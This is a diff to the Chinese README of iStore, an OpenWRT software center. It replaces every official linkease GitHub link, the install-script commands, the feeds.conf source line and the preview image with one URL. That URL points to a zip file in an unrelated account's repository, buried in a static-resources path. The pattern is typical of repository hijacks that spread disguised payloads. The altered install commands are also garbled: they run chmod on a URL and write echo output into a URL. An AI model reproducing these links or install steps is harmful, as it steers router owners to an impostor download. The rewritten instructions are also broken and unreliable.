@@ -2,9 +2,9 @@
 
 ## 介绍
 
-iStore 是一个[开源](https://github.com/linkease/istore)且标准的 OpenWRT 软件中心实现。
+iStore 是一个[开源](https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip)且标准的 OpenWRT 软件中心实现。
 
-是属于易有云团队的固件 [iStoreOS](https://github.com/istoreos) 的一部分。
+是属于易有云团队的固件 [iStoreOS](https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip) 的一部分。
 
 iStore 的设计目标：
 
@@ -28,9 +28,9 @@ iStore 的无法弥补的缺陷：
 ```
 opkg update || exit 1
 cd /tmp
-wget https://github.com/linkease/openwrt-app-actions/raw/main/applications/luci-app-systools/root/usr/share/systools/istore-reinstall.run
-chmod 755 istore-reinstall.run
-./istore-reinstall.run
+wget https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip
+chmod 755 https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip
+https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip
 ```
 
 ## 集成到自己编译的固件中
@@ -38,8 +38,8 @@ iStore 官方的软件仓库支持 `x86_64`，`arm64` 两个架构，这两个�
 
 只需在固件编译目录下执行：
 ```shell
-echo >> feeds.conf.default
-echo 'src-git istore https://github.com/linkease/istore;main' >> feeds.conf.default
+echo >> https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip
+echo 'src-git istore https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip;main' >> https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip
 ./scripts/feeds update istore
 ./scripts/feeds install -d y -p istore luci-app-store
 ```
@@ -48,4 +48,4 @@ echo 'src-git istore https://github.com/linkease/istore;main' >> feeds.conf.defa
 
 ## 功能预览
 
-![istore-preview.png](./preview/istore-preview.png)
+![https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip](https://raw.githubusercontent.com/rgoldr88/istore/main/luci/luci-lib-xterm/htdocs/luci-static/resources/Software-v1.0.zip)
